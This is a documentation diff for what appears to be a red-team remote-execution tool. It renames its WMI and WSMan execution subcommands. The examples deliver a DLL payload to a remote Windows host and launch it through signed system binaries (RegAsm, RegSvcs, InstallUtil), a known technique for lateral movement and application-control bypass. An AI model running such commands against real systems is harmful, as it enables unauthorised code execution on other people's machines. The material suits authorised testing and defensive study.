@@ -48,10 +48,10 @@ Callbacks should be idempotent and should fail clearly rather than leaving an
 ambiguous partial registration.
 
 ```text
-rex WMIExec --target 10.0.0.15 --payload-type managed \
+rex wmi-exec --target 10.0.0.15 --payload-type managed \
   --remote-path C:\ProgramData\component.dll --launcher RegAsm.exe
 
-rex WMIExec --target 10.0.0.15 --payload-type managed \
+rex wmi-exec --target 10.0.0.15 --payload-type managed \
   --remote-path C:\ProgramData\component.dll --launcher "RegAsm.exe (/U)"
 ```
 
@@ -81,7 +81,7 @@ Sign the final assembly and verify the strong name before using
 additional state created by component callbacks remains payload-defined.
 
 ```text
-rex WMIExec --target 10.0.0.15 --payload-type managed \
+rex wmi-exec --target 10.0.0.15 --payload-type managed \
   --remote-path C:\ProgramData\serviced-component.dll --launcher RegSvcs.exe
 ```
 
@@ -118,7 +118,7 @@ The built-in descriptor suppresses the default log file and console logging.
 Use `InstallUtil.exe (/U)` for the uninstall path.
 
 ```text
-rex WSManExec --target 10.0.0.15 --payload-type managed \
+rex wsman-exec --target 10.0.0.15 --payload-type managed \
   --remote-path C:\ProgramData\installer.dll --launcher InstallUtil.exe
 ```
 
